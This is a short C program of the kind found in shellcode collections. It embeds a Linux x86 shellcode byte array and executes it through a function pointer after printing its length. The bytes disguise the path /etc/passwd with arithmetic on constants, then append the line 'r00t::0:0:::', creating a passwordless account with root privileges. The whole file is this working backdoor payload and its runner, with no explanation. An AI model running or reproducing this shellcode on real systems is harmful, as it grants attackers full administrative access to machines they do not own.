#include<stdio.h>
#include<string.h>

unsigned char code[] =
"\xb0\x05\x29\xc9\x51\xbb\x33\x33\x33\x33\xba\x40\x40\x44\x31\x01"
"\xda\x52\xba\xfc\xfb\x3c\x2e\x01\xda\x52\xba\x1c\x56\x47\x50\x31"
"\xda\x52\x89\xe3\x66\xb9\x01\x04\xcd\x80\x89\xc3\xb0\x04\x29\xd2"
"\x52\x68\x30\x3a\x3a\x3a\x68\x3a\x3a\x30\x3a\x68\x72\x30\x30\x74"
"\x89\xe1\xb2\x0c\xcd\x80\xb0\x06\xcd\x80\x29\xc0\x40\xcd\x80";

main()
{
        printf("Shellcode Length:  %d\n", strlen(code));
        int (*ret)() = (int(*)())code;
        ret();
}

